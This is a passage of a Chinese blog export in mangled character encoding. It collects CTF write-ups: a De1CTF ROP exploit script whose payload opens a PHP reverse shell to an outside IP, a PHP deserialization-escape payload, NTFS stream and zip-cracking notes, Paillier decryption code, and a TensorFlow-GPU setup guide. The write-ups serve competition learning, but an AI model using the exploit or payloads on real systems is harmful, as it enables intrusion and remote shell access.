*s = requests.Session()headers= { \"Cookie\":\"PHPSESSID=g6u5esdng9h7a2ei3m93srf0mp\"}php_base = 0x7f546c3f7000libc_base = 0x7f546eacb000minclude_base = 0x7f546d84a000#filename = \"index.php\" #Here input filename you want to readINITIAL = 1526 - 9def main(): global INITIAL, php_base, minclude_base, libc_base if len(sys.argv) &lt; 2: print('usage: {} path'.format(sys.argv[0])) return exp = False debug = False filename = sys.argv[1] #Here input filename you want to read if filename == 'exp' or filename == 'debug': if filename == 'debug': debug = True php_base = 0x7f40b6ec3000 minclude_base = 0x7f40b6eba000 libc_base = 0x7f40b7fa0000 orig_ret = 0x7f546d151ac0 pop_rdi = php_base + 0x000000000014b260 # pop rdi ; ret php_info = 0x47bd10 - 0x100000 + php_base ret = php_base + 0x14b261 jmp_rdi = php_base + 0x000000000019f729 # jmp rdi if debug: mov_to_rdi = 0x00000000000494ea + libc_base # mov qword ptr [rdi], rsi ; ret else: mov_to_rdi = 0x00000000000494e5 + libc_base # mov eax, 1 ; mov qword ptr [rdi], rsi ; ret pop_pop = 0x000000000000135e + minclude_base # pop rbp ; pop r12 ; ret pop_rsi = 0x000000000002440e + libc_base # pop rsi ; ret exp = True system = libc_base + 0x449c0 halt = p64(pop_rdi) + p64(jmp_rdi) + p64(jmp_rdi) def write(addr, val): assert len(val) == 8 return p64(pop_rdi) + p64(addr) + p64(pop_rsi) + val + p64(mov_to_rdi) area = minclude_base + 0x4000 cmd = b\"php -r '$sock=fsockopen(\\\"118.178.180.118\\\",52333);exec(\\\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\\\");'\" cur = 0 rop = b'' buf = cmd[:8] rop += write(area, buf) cur += 8 buf = cmd[8:16] rop += write(area + 8, buf) cur += 8 rop += p64(pop_pop) rop += p64(0xdeadbeef) rop += p64(0xdeadbeef) while cur &lt; len(cmd): buf = cmd[cur: cur+8] if len(buf) != 8: buf = buf.ljust(8, b'\\0') rop += write(area + cur, buf) cur += 8 rop += p64(pop_rdi) rop += p64(area) rop += p64(system) rop += halt filename = b'a' * (0x88) + rop INITIAL += len(filename) if len(sys.argv) == 3: save_filename = sys.argv[2] else: save_filename = os.path.basename(filename) data = { \"search\":filename, \"submit\":\"submit\" } #url = \"http://134.175.185.244/select.php\" if debug: url = \"http://localhost:51111/select.php\" else: #url = \"http://49.51.251.99/select.php\" url = \"http://134.175.185.244/select.php\" r = requests.post(url, data=data, headers=headers) if not exp: f = open(save_filename, \"wb\") f.write(r.content[INITIAL:]) f.close() else: print(r.content)if __name__ == '__main__': main() è¿™é¢˜å°±å…ˆæ”¾ä¸€ä¸‹æŠŠï¼Œéœ€è¦æ…¢æ…¢æ¶ˆåŒ–ã€‚ Misc Chowderè€ƒå¯Ÿæµé‡å®¡è®¡ã€å‹ç¼©åŒ…å¯†ç çˆ†ç ´ã€NTFSæµéšè—æ–‡ä»¶ çŸ¥è¯†æ‰©å±•å‚è€ƒå…³äºNTFSæ•°æ®æµåŠæ–‡ä»¶éšè—ï¼š NTFSäº¤æ¢æ•°æ®æµï¼ˆalternate data streamsï¼Œç®€ç§°ADSï¼‰æ˜¯NTFSç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œåœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸‹ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½å¯ä»¥å­˜åœ¨å¤šä¸ªæ•°æ®æµï¼Œå°±æ˜¯è¯´é™¤äº†ä¸»æ–‡ä»¶æµä¹‹å¤–è¿˜å¯ä»¥æœ‰è®¸å¤šéä¸»æ–‡ä»¶æµå¯„å®¿åœ¨ä¸»æ–‡ä»¶æµä¸­ã€‚å®ƒä½¿ç”¨èµ„æºæ´¾ç”Ÿæ¥ç»´æŒä¸æ–‡ä»¶ç›¸å…³çš„ä¿¡æ¯ï¼Œè™½ç„¶æˆ‘ä»¬æ— æ³•çœ‹åˆ°æ•°æ®æµæ–‡ä»¶ï¼Œä½†æ˜¯å®ƒå´æ˜¯çœŸå®å­˜åœ¨äºæˆ‘ä»¬çš„ç³»ç»Ÿä¸­çš„ã€‚åˆ›å»ºä¸€ä¸ªæ•°æ®äº¤æ¢æµæ–‡ä»¶çš„æ–¹æ³•å¾ˆç®€å•ï¼Œå‘½ä»¤ä¸ºâ€œå®¿ä¸»æ–‡ä»¶ï¼šå‡†å¤‡ä¸å®¿ä¸»æ–‡ä»¶å…³è”çš„æ•°æ®æµæ–‡ä»¶â€ã€‚ åˆ©ç”¨è¿™ç§æ•°æ®æµå…³è”çš„æ–¹å¼ï¼Œå³å¯å°†ä¸€ä¸ªæ–‡ä»¶çš„æ•°æ®æµå…³è”åˆ°å¦ä¸€ä¸ªæ–‡ä»¶ä¸Šï¼Œè¿™ç§æ–¹å¼ä¸‹ï¼Œç›®å½•ä¸‹ç›´æ¥diræ˜¯çœ‹ä¸åˆ°è¢«å…³è”çš„æ•°æ®æµçš„ï¼ˆå½“ç„¶è¢«å…³è”çš„åŸå§‹æ–‡ä»¶è‚¯å®šä¸åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼‰ï¼Œå³å®ç°äº†éšè—ï¼Œä¸è¿‡dir /rå¯ä»¥å°†å…¶åˆ—ä¸¾å‡ºæ¥ã€‚ è§£é¢˜æ‹¿åˆ°é¢˜ç›®ï¼Œæ˜¯ä¸€ä¸ªæµé‡åŒ…ï¼Œæµé‡å®¡è®¡å‘ç°è¿›è¡Œäº†å¤šæ¬¡uploadï¼Œåˆ©ç”¨wiresharkå¯¼å‡ºHTTPå¯¹è±¡å¯ä»¥å°†ä¸Šä¼ çš„æ–‡ä»¶å¯¼å‡ºï¼š åœ¨å¯¼å‡ºHTTPå¯¹è±¡æ—¶ï¼Œå¯ä»¥çœ‹åˆ°æœ‰7æ¬¡uploadçš„åŠ¨ä½œï¼Œæ¯ä¸€ç»„åŒ…å«ä¸¤ä¸ªå¯å¯¼å‡ºçš„å¯¹è±¡upload_file.phpï¼Œæ³¨æ„è§‚å¯Ÿï¼Œä¸¤ä¸ªå¯¹è±¡é‡Œä¸€ä¸ªæ˜¯multipart/form-dataä¸€ä¸ªæ˜¯text/htmlçš„ï¼Œæ˜¾ç„¶å‰è€…æ˜¯åŒ…å«ä¸Šä¼ æ–‡ä»¶çš„æ•°æ®çš„ï¼Œå°†å…¶å¯¼å‡ºï¼Œå¯¼å‡ºä¹‹åç›´æ¥æ‰“å¼€å‘ç°æ˜¯ä¸Šä¼ æ–‡ä»¶æ—¶å€™çš„åŒ…æ•°æ®ï¼Œè€Œä¸æ˜¯phpä»£ç ï¼š è€Œä¸”æ˜¾ç„¶ï¼Œå›¾ç‰‡çš„æ•°æ®å°±åœ¨å…¶ä¸­ï¼Œé‚£å°±ç®€å•äº†ï¼Œ010editorå°†æ•°æ®å¤„ç†ä¸‹ï¼Œåªä¿ç•™å›¾ç‰‡æ•°æ®ï¼Œå†æ”¹åç¼€å°±è¡Œäº†å˜› ä¸€ä¸ªèµ„æºçš„urlï¼Œè®¿é—®å¯ä»¥ä¸‹è½½åˆ°ä¸€ä¸ªdocxçš„å‹ç¼©åŒ…ï¼Œè§£å‹æ‰“å¼€æ˜¯è¿™ä¸ªæ ·å­â€¦ è€ƒè™‘åˆ°ä¹‹å‰æœ‰çš„docxæ–‡ä»¶ä¼šéšè—å‹ç¼©åŒ…ï¼Œæ‹–åˆ°è§£å‹å·¥å…·é‡Œçœ‹çœ‹ï¼Œè¿˜çœŸæœ‰ ä½†æ˜¯éœ€è¦å¯†ç ï¼Œåˆ°è¿™ä¸€æ­¥ï¼Œé¢˜ç›®ä¹Ÿç»™å‡ºHintï¼šå‹ç¼©åŒ…å¯†ç æš´ç ´è€ƒç‚¹ä¸­ï¼Œå¯†ç çš„é•¿åº¦ä¸º6ä½ï¼Œå‰ä¸¤ä½ä¸ºDEé‚£å°±æ©ç çˆ†ç ´å‘—ï¼Œä¸ŠARCHPRï¼Œè®¾ç½®æˆæ©ç æ¨¡å¼ï¼Œå¼€å§‹è·‘~ æ‹¿åˆ°å¯†ç ~ è§£å‹ä¹‹åå‘ç°è¿˜æ˜¯ä¸€å¼ å›¾ï¼Œå¥—å¨ƒäº†ã€‚ã€‚ã€‚ ä¸è¿‡è¿™ä¸ªå›¾æ‹–åˆ°è§£å‹å·¥å…·é‡Œåˆå¯ä»¥çœ‹åˆ°ä¸‰ä¸ªæ–‡ä»¶ï¼š flag.txté‡Œçš„æ–‡ä»¶æ˜¯å‡çš„ï¼Œä½†æ˜¯åªè¦ä¸‰ä¸ªæ–‡ä»¶ï¼Œå›¾ç‰‡ä¸­åˆæç¤ºI AM FLAGï¼Œè¯•äº†å…¶ä»–åŠæ³•ä¹Ÿä¸è¡Œâ€¦åæ¥äº†è§£åˆ°ï¼Œå¯èƒ½æ˜¯åˆ©ç”¨äº†NTFSæ•°æ®æµæ¥éšè—flagäº†ï¼ŒWindowsä¸‹åˆ—ä¸¾è§£å‹å‡ºçš„ç›®å½•è¯•è¯•ï¼š æœç„¶å­˜åœ¨éšè—çš„NTFSæµï¼Œå°†fffffffflllll.txtçš„å†…å®¹å…³è”åˆ°äº†666.jpgé‡Œï¼Œè¿™æ ·ï¼Œå…¶å®ç”¨notepadè¯»å–666.jpg:fffffffflllll.txtå°±å¯ä»¥äº† æˆé•¿è·¯ä¸Šï¼Œè¦å­¦çš„è¿˜å¾ˆå¤š","link":"/2020/05/02/De1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"æ·±åº¦å­¦ä¹ ç¯å¢ƒé…ç½®","text":"ä¹‹å‰ä¸€æ®µæ—¶é—´ï¼Œä¸€ç›´åœ¨ç”¨CPUè·‘ç®—æ³•è®­ç»ƒè‡ªå·±çš„æ¨¡å‹ï¼Œä»Šå¤©çªç„¶æ„è¯†åˆ°æ˜¯æ”¯æŒGPUçš„å•Šï¼Œåˆå¿«åˆçœèµ„æºï¼Œä¸ç”¨å®ƒä¸æ˜¯å‚»å—â€¦ğŸ™„ ä¸‹é¢è®°å½•ä¸€ä¸‹å¦‚ä½•é…ç½®TensorFlow-gpu + CUDA + Keraså®ç°GPUè®­ç»ƒæ·±åº¦å­¦ä¹ ç®—æ³•çš„æ¨¡å‹ã€‚ ä¸€äº›ç®€ä»‹å…³äºTensorFlowï¼š TensorFlow æ˜¯ä¸€ä¸ªç«¯åˆ°ç«¯å¼€æºæœºå™¨å­¦ä¹ å¹³å°ã€‚å®ƒæ‹¥æœ‰ä¸€ä¸ªå…¨é¢è€Œçµæ´»çš„ç”Ÿæ€ç³»ç»Ÿï¼Œå…¶ä¸­åŒ…å«å„ç§å·¥å…·ã€åº“å’Œç¤¾åŒºèµ„æºï¼Œå¯åŠ©åŠ›ç ”ç©¶äººå‘˜æ¨åŠ¨å…ˆè¿›æœºå™¨å­¦ä¹ æŠ€æœ¯çš„å‘å±•ï¼Œå¹¶ä½¿å¼€å‘è€…èƒ½å¤Ÿè½»æ¾åœ°æ„å»ºå’Œéƒ¨ç½²ç”±æœºå™¨å­¦ä¹ æä¾›æ”¯æŒçš„åº”ç”¨ã€‚ å…³äºKerasï¼š Kerasæ˜¯ç”¨Pythonç¼–å†™çš„é«˜çº§ç¥ç»ç½‘ç»œAPIï¼Œèƒ½å¤Ÿåœ¨TensorFlowï¼ŒCNTKæˆ–Theanoä¹‹ä¸Šè¿è¡Œã€‚å®ƒçš„å¼€å‘ç€çœ¼äºå®ç°å¿«é€Ÿå®éªŒã€‚èƒ½å¤Ÿä»¥æœ€å°çš„å»¶è¿Ÿå°†æƒ³æ³•ä»˜è¯¸å®è·µæ˜¯è¿›è¡Œè‰¯å¥½ç ”ç©¶çš„å…³é”®ã€‚ å…è®¸è½»æ¾å¿«é€Ÿåœ°è¿›è¡ŒåŸå‹åˆ¶ä½œï¼ˆé€šè¿‡ç”¨æˆ·å‹å¥½æ€§ï¼Œæ¨¡å—åŒ–å’Œå¯æ‰©å±•æ€§ï¼‰ã€‚ æ”¯æŒå·ç§¯ç½‘ç»œå’Œå¾ªç¯ç½‘ç»œï¼Œä»¥åŠä¸¤è€…çš„ç»„åˆã€‚ åœ¨CPUå’ŒGPUä¸Šæ— ç¼è¿è¡Œã€‚ å…³äºCUDAï¼š CUDA(ComputeUnified Device Architecture)ï¼Œæ˜¯æ˜¾å¡å‚å•†NVIDIAæ¨å‡ºçš„è¿ç®—å¹³å°ã€‚ CUDAæ˜¯ä¸€ç§ç”±NVIDIAæ¨å‡ºçš„é€šç”¨å¹¶è¡Œè®¡ç®—æ¶æ„ï¼Œè¯¥æ¶æ„ä½¿GPUèƒ½å¤Ÿè§£å†³å¤æ‚çš„è®¡ç®—é—®é¢˜ã€‚ å…³äºcuDNNï¼š NVIDIA cuDNNæ˜¯ç”¨äºæ·±åº¦ç¥ç»ç½‘ç»œçš„GPUåŠ é€Ÿåº“ã€‚å®ƒå¼ºè°ƒæ€§èƒ½ã€æ˜“ç”¨æ€§å’Œä½å†…å­˜å¼€é”€ã€‚NVIDIA cuDNNå¯ä»¥é›†æˆåˆ°æ›´é«˜çº§åˆ«çš„æœºå™¨å­¦ä¹ æ¡†æ¶ä¸­ï¼Œå¦‚è°·æ­Œçš„Tensorflowã€åŠ å·å¤§å­¦ä¼¯å…‹åˆ©åˆ†æ ¡çš„æµè¡Œcaffeè½¯ä»¶ã€‚ç®€å•çš„æ’å…¥å¼è®¾è®¡å¯ä»¥è®©å¼€å‘äººå‘˜ä¸“æ³¨äºè®¾è®¡å’Œå®ç°ç¥ç»ç½‘ç»œæ¨¡å‹ï¼Œè€Œä¸æ˜¯ç®€å•è°ƒæ•´æ€§èƒ½ï¼ŒåŒæ—¶è¿˜å¯ä»¥åœ¨GPUä¸Šå®ç°é«˜æ€§èƒ½ç°ä»£å¹¶è¡Œè®¡ç®—ã€‚ å…³äºCUDA + cuDNNçš„ç»„åˆï¼š CUDAçœ‹ä½œæ˜¯ä¸€ä¸ªå·¥ä½œå°ï¼Œä¸Šé¢é…æœ‰å¾ˆå¤šå·¥å…·ï¼Œå¦‚é”¤å­ã€èºä¸åˆ€ç­‰ã€‚cuDNNæ˜¯åŸºäºCUDAçš„æ·±åº¦å­¦ä¹ GPUåŠ é€Ÿåº“ï¼Œæœ‰äº†å®ƒæ‰èƒ½åœ¨GPUä¸Šå®Œæˆæ·±åº¦å­¦ä¹ çš„è®¡ç®—ã€‚å®ƒå°±ç›¸å½“äºå·¥ä½œçš„å·¥å…·ï¼Œæ¯”å¦‚å®ƒå°±æ˜¯ä¸ªæ‰³æ‰‹ã€‚ä½†æ˜¯CUDAè¿™ä¸ªå·¥ä½œå°ä¹°æ¥çš„æ—¶å€™ï¼Œå¹¶æ²¡æœ‰é€æ‰³æ‰‹ã€‚æƒ³è¦åœ¨CUDAä¸Šè¿è¡Œæ·±åº¦ç¥ç»ç½‘ç»œï¼Œå°±è¦å®‰è£…cuDNNï¼Œå°±åƒä½ æƒ³è¦æ‹§ä¸ªèºå¸½å°±è¦æŠŠæ‰³æ‰‹ä¹°å›æ¥ã€‚è¿™æ ·æ‰èƒ½ä½¿GPUè¿›è¡Œæ·±åº¦ç¥ç»ç½‘ç»œçš„å·¥ä½œï¼Œå·¥ä½œé€Ÿåº¦ç›¸è¾ƒCPUå¿«å¾ˆå¤šã€‚ ç¯å¢ƒé…ç½®é€šè¿‡ä»Šå¤©è¸©çš„å‘ï¼Œæé†’è¿‘æœŸå¦‚æœéœ€è¦ç”¨tensorflow+cudaå®ç°GPUè¿ç®—çš„è¯ï¼Œæœ€å¥½å®‰è£…tensorflow-gpu-2.0.0å’Œduca-10.0ï¼Œæˆ–è€…æ›´ä½çš„ç‰ˆæœ¬ï¼Œå…·ä½“å¯ä»¥å‚è€ƒå®˜ç½‘å„ç‰ˆæœ¬å¯¹åº”çš„ä¿¡æ¯ã€‚ å®‰è£…tensorflowpythonä¸‹ç›´æ¥è½¬tensorflow-gpuçš„åº“å³å¯ï¼Œå“¦ï¼python3çš„ç‰ˆæœ¬ä¸€å®šè¦åœ¨3.7ä¹‹ä¸‹å“¦ï¼Œè¿˜æœ‰ä¸€å®šè¦64bitçš„â€¦ python3 -m pip install tensorflow-gpu==2.0.0# æˆ–è€…ç”¨å›½å†…é•œåƒæºåŠ é€Ÿå®‰è£…python3 -m pip install tensorflow-gpu==2.0.0 -i https://pypi.tuna.tsinghua.edu.cn/simple å®‰è£…Keraspythonç›´æ¥è£…åº“ python3 -m pip install keras å®‰è£…é…ç½®DUCAè¿™é‡Œè£…çš„tensorflowæ˜¯2.0.0ç‰ˆæœ¬ï¼Œå› æ­¤ducaéœ€è¦10.0ç‰ˆæœ¬ï¼Œå¯ä»¥å»å®˜ç½‘ä¸‹è½½v10.0ï¼Œé€‰æ‹©exe(local)ï¼Œå¯ä»¥ç›´æ¥å®Œæ•´åŒ–å®‰è£…ã€‚ ä¸‹è½½ä¹‹åè¿è¡Œå®‰è£…ç¨‹åºï¼Œå¦‚æœä¸æƒ³éº»çƒ¦ç›´æ¥é»˜è®¤ç®€æ˜“å®‰è£…å³å¯ï¼Œå®‰è£…å®Œæ¯•ä¹‹åå¯ä»¥æµ‹è¯•ä¸€ä¸‹ï¼Œå¯èƒ½åé¦ˆå¦‚ä¸‹ä¿¡æ¯ï¼š &gt;&gt;&gt; import tensorflow2020-04-07 16:00:12.823507: W tensorflow/stream_executor/platform/default/dso_loader.cc:55] Could not load dynamic library 'cudart64_100.dll'; dlerror: cudart64_101.dll not found ä¹Ÿå°±æ˜¯è¯´ç¼ºå°‘äº†cudart64_100.dllè¿™ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œå¯ä»¥å»è¿™é‡Œä¸‹è½½ï¼Œä¸‹è½½å®Œä¹‹åï¼Œå°†è§£å‹å¾—åˆ°çš„æ–‡ä»¶æ”¾å…¥C:\\Windows\\System32ç›®å½•ä¸‹ï¼Œä¸è¿‡é…ç½®å¹¶æœªå®Œæˆï¼Œå› ä¸ºcuDNNè¿˜æœªå®‰è£…é…ç½®ã€‚ é…ç½®cuDNNå®˜ç½‘ä¸‹è½½ä¸ducaå¯¹åº”ç‰ˆæœ¬çš„cuDNNï¼Œä¸è¿‡é¦–å…ˆéœ€è¦æ³¨å†Œã€ç™»å½•ã€å®Œæˆä¸€ä¸ªå°è°ƒæŸ¥é—®å·ï¼Œä¹Ÿä¸å¤æ‚çš„ã€‚ ä¸‹è½½å®Œæ¯•ä¹‹åï¼Œå°†å‹ç¼©åŒ…é‡Œçš„å†…å®¹æ”¾å…¥CUDAå®‰è£…çš„ç›®å½•C:\\ProgramData\\NVIDIA Corporation\\CUDA Samples\\v10.0ï¼Œå¦‚å›¾ï¼š åŒæ—¶éœ€è¦å°†cudnn64_7.dllæ”¾å…¥C:\\Windows\\System32ä¸‹ï¼Œä¸ç„¶å¯èƒ½ä»ç„¶æ‰¾ä¸åˆ°è¯¥dllã€‚ æ­¤æ—¶å†å»æµ‹è¯•ï¼Œåº”è¯¥å°±æ²¡é—®é¢˜äº†ï¼Œå¯ä»¥ç”¨å¦‚ä¸‹è¯­å¥æµ‹è¯•ï¼š &gt;&gt;&gt; a = tf.test.is_built_with_cuda() # åˆ¤æ–­CUDAæ˜¯å¦å¯ä»¥ç”¨&gt;&gt;&gt; b = tf.test.is_gpu_available(... cuda_only=False,... min_cuda_compute_capability=None... ) # åˆ¤æ–­GPUæ˜¯å¦å¯ä»¥ç”¨ æˆåŠŸé…ç½®çš„æ•ˆæœå¦‚ä¸‹å›¾ï¼š åé¦ˆå¦‚ä¸Šä¿¡æ¯ï¼Œåˆ™è¡¨æ˜é…ç½®å·²ç»æˆåŠŸï¼Œå†æ¬¡è·‘ç®—æ³•å°±æ˜¯GPUäº†ï¼Œåˆå¿«åˆæ‹‰é£~ é—®é¢˜åŠè§£å†³åœ¨è‡ªå·±é…ç½®çš„æ—¶å€™ï¼Œè¿œè¿œæ²¡æœ‰ä¸Šé¢è¯´çš„è¿™ä¹ˆç®€å•ï¼Œèµ·åˆç›´æ¥é»˜è®¤è£…äº†tensorflowï¼Œç»“æœæ˜¯æœ€æ–°ç‰ˆ2.1.0çš„ï¼ŒæŸ¥äº†ä¸€ä¸‹ï¼Œä¹Ÿå°±å®‰è£…äº†cuda10.2çš„ç‰ˆæœ¬ï¼Œç»“æœæŠ¥é”™æ‰¾ä¸åˆ°cudart64_100.dllï¼Œå»ä¸Šé¢æä¾›çš„é“¾æ¥åº“çš„ä¸‹è½½åœ°å€æ‰¾åˆ°å®‰è£…å°±è¡Œäº†ï¼Œç„¶è€Œé—®é¢˜å¹¶æ²¡æœ‰é‚£ä¹ˆç®€å•ï¼Œåœ¨é…ç½®å¥½cuDNNä¹‹åï¼Œç”¨å‰é¢çš„æ–¹æ³•è¿›è¡Œæµ‹è¯•ï¼Œä¸€ç›´æŠ¥é”™ï¼š cudaGetDevice() failed. Status: cudaGetErrorString symbol not found. è¿™æ˜¯ä»€ä¹ˆé—®é¢˜å‘¢ï¼Ÿ ç½‘ä¸Šè¿˜æœ‰äººè¯´æ˜¯NVIDIAé©±åŠ¨ç‰ˆæœ¬çš„é—®é¢˜ï¼Œåœ¨æ§åˆ¶é¢æ¿çœ‹äº†ä¸€ä¸‹ï¼Œæˆ‘çš„æ˜¯441ï¼Œå·²ç»æ»¡è¶³è¦æ±‚äº†â€¦ æœ‰äººè¯´tensorflow-2.1.0è¦å’Œduca-10.1é…åˆç€ç”¨ï¼Œç»“æœè¿˜æ˜¯å¾ˆä¸OKâ€¦åº”è¯¥æ˜¯æ–°ç‰ˆæœ¬å­˜åœ¨çš„é—®é¢˜ï¼Œæ¯•ç«Ÿè¿tensorflowç›®å‰éƒ½å¹¶æœªæ”¯æŒpython3çš„å„ä¸ªç‰ˆæœ¬â€¦ æœ€åï¼Œå§‘ä¸”ç›´æ¥å°†tensorflowæ¢æˆäº†tensorflow-2.0.0çš„ç‰ˆæœ¬ï¼Œä¹Ÿå°±æ˜¯å‰é¢å®‰è£…æ­¥éª¤é‡Œè®²åˆ°çš„ï¼Œç„¶åå†é…åˆå®‰è£…duca-10.0è¿›è¡Œé…ç½®ï¼Œç»ˆäºæˆåŠŸè§£å†³äº†é—®é¢˜ã€‚ğŸ˜ å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¤Ÿå¸®åŠ©åˆ°ä½ ","link":"/2020/05/01/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"title":"å®‰æ’æœˆèµ›DASCTF","text":"ä¸­åˆå°±ç¡äº†ä¸€ä¼šå„¿èµ·æ¥åšé¢˜ï¼Œè¿˜è¢«å®¤å‹ç»™dissäº†â€¦ğŸ™„ï¼Œæå¾—ä¸‹åˆä¸€ç›´æææƒšæƒšâ€¦ ä¹Ÿåšäº†å‡ é“é¢˜ï¼Œç®€å•å†™ä¸‹é¢˜è§£å§ï¼Œå¸ˆå‚…ä»¬å‹¿æ¶ã€‚ã€‚ã€‚ web1è€ƒå¯Ÿååºåˆ—åŒ–é€ƒé€¸ï¼Œç±»ä¼¼çš„é¢˜ä¹‹å‰æœ‰å†™è¿‡ï¼š0CTF2019-piapiapiaã€æ˜¥ç§‹å…¬ç›Šèµ›ï¼Œè¿™é‡Œä¸å†è¯¦ç»†è§£é‡Šã€‚ è§£é¢˜è¿›å…¥é¢˜ç›®ç»™å‡ºæºç ï¼š &lt;?phpshow_source(\"index.php\");function write($data) { return str_replace(chr(0) . '*' . chr(0), '\\0\\0\\0', $data);}function read($data) { return str_replace('\\0\\0\\0', chr(0) . '*' . chr(0), $data);}class A{ public $username; public $password; function __construct($a, $b){ $this-&gt;username = $a; $this-&gt;password = $b; }}class B{ public $b = 'gqy'; function __destruct(){ $c = 'a'.$this-&gt;b; echo $c; }}class C{ public $c; function __toString(){ //flag.php echo file_get_contents($this-&gt;c); return 'nice'; }}$a = new A($_GET['a'],$_GET['b']);//çœç•¥äº†å­˜å‚¨åºåˆ—åŒ–æ•°æ®çš„è¿‡ç¨‹,ä¸‹é¢æ˜¯å–å‡ºæ¥å¹¶ååºåˆ—åŒ–çš„æ“ä½œ$b = unserialize(read(write(serialize($a)))); æ ¹æ®å­—ç¬¦æ›¿æ¢çš„è§„åˆ™å¯ä»¥æ„é€ payloadå¦‚ä¸‹ï¼š a=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;b=a\";s:8:\"password\";O:1:\"B\":1:{s:1:\"b\";O:1:\"C\":1:{s:1:\"c\";s:8:\"flag.php\";}}} payloadæ‰“è¿‡å»ä¹‹åçœ‹æºç æ‹¿åˆ°flagã€‚ cry1-not RSAè¿™é¢˜è€ƒå¯ŸPaillieråŠ å¯†ç®—æ³•ï¼Œè¿™é¢˜ä¹Ÿæ˜¯å­¦åˆ°äº†æ–°çŸ¥è¯†ï¼š PaillieråŠ å¯†ç³»ç»Ÿï¼Œæ˜¯1999å¹´Paillierå‘æ˜çš„æ¦‚ç‡å…¬é’¥åŠ å¯†ç³»ç»Ÿã€‚åŸºäºå¤åˆå‰©ä½™ç±»çš„å›°éš¾é—®é¢˜ã€‚è¯¥åŠ å¯†ç®—æ³•æ˜¯ä¸€ç§åŒæ€åŠ å¯†ï¼Œæ»¡è¶³åŠ æ³•å’Œæ•°ä¹˜åŒæ€ã€‚ è¿™ç¯‡åšå®¢æœ‰å¯¹è¯¥ç®—æ³•çš„è®²è§£ï¼Œè¿™é‡Œæˆ‘å°±ä¸è¿‡å¤šè®²è§£äº†ã€‚ è§£é¢˜ç»™å‡ºæºç å¦‚ä¸‹ï¼š ...m = long2bytes(flag)n = p * qr = random.randint(1,n)g = n + 1c = (pow(g,m,n*n))*pow(r,n,n*n))%n*n...# n=... c=... emmmâ€¦ å…¶å®åšé¢˜çš„æ—¶å€™å¿˜äº†æŠŠæºç è®°ä¸‹æ¥äº†ï¼Œå°±ç®€å•é€šè¿‡è§£å¯†è„šæœ¬é€†äº†ä¸€ä¸‹ğŸ˜… é€šè¿‡å¯†æ–‡cçš„äº§ç”Ÿæ˜æ˜¾çœ‹å‡ºæ¥æ˜¯Paillierç®—æ³•è¿›è¡ŒåŠ å¯†çš„ï¼Œæ—¢ç„¶å¦‚æ­¤ï¼Œé‚£ä¹ˆnåº”è¯¥æ˜¯å¯ä»¥åˆ†è§£çš„ï¼Œyafuåˆ†è§£äº†ä¸€ä¸‹ï¼Œæœç„¶å¯ä»¥ã€‚æ—¶é—´çŸ­ï¼Œè‡ªå·±æ‡’å¾—å†™äº†è§£å¯†è„šæœ¬äº†ï¼Œç½‘ä¸Šæ‰¾äº†ä¸€ä¸ªè‡ªå·±åˆæ”¹äº†ä¸€ä¸‹ï¼š # paillier cryptosystemimport gmpy2import libnumdef L(x, n): return (x - 1) // ndef decipher(c, pk, sk): [n, g] = pk lmd = sk u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** 2), n), n) % n m = L(gmpy2.powmod(c, lmd, n ** 2), n) * u % n plaintext = libnum.n2s(m) return plaintextc = 29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549n = 6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093g = n+1pk = [n,g]# pã€qç”±yafuåˆ†è§£è€Œæ¥p = 80006336965345725157774618059504992841841040207998249416678435780577798937819q = 80006336965345725157774618059504992841841040207998249416678435780577798937447sk = (p-1) * (q-1)m = decipher(c, pk, sk)print(m) å†èµ é€ä¸€ä¸ªæ•´ä¸ªåŠ å¯†ã€è§£å¯†å®ç°çš„ä»£ç ï¼š import gmpy2import randomimport timeimport libnumdef get_prime(rs): p = gmpy2.mpz_urandomb(rs, 1024) while not gmpy2.is_prime(p): p = p + 1 return pdef L(x, n): return (x - 1) / ndef keygen(): rs = gmpy2.random_state(int(time.time())) p = get_prime(rs) q = get_prime(rs) n = p * q lmd = (p - 1) * (q - 1) #g = random.randint(1, n ** 2) g = n + 1 if gmpy2.gcd(L(gmpy2.powmod(g, lmd, n ** 2), n), n) != 1: print('[!] g is not good enough') exit() pk = [n, g] sk = lmd return pk, skdef encipher(plaintext, pk): m = libnum.s2n(plaintext) n, g = pk r = random.randint(1, n ** 2) c = gmpy2.powmod(g, m, n ** 2) * gmpy2.powmod(r, n, n ** 2) % (n ** 2) return cdef decipher(c, pk, sk): [n, g] = pk lmd = sk u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** 2), n), n) % n m = L(gmpy2.powmod(c, lmd, n ** 2), n) * u % n plaintext = libnum.n2s(m) return plaintextif __name__ == '__main__': pk, sk = keygen() plaintext = raw_input('Please input your message: ') ciphertext = encipher(plaintext, pk) print('Ciphertext:', ciphertext) plaintext = decipher(ciphertext, pk, sk) print('Plaintext:', plaintext) è¿˜æœ‰å‡ ä¸ªmiscçš„é¢˜ï¼Œå°±ä¸å†å†™é¢˜è§£äº†ï¼Œæœ€è¿‘æœ‰ç‚¹å¿™â€¦","link":"/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BDSACTF/"},{"title":"è™ç¬¦CTFä¸¤é“webå­¦ä¹ 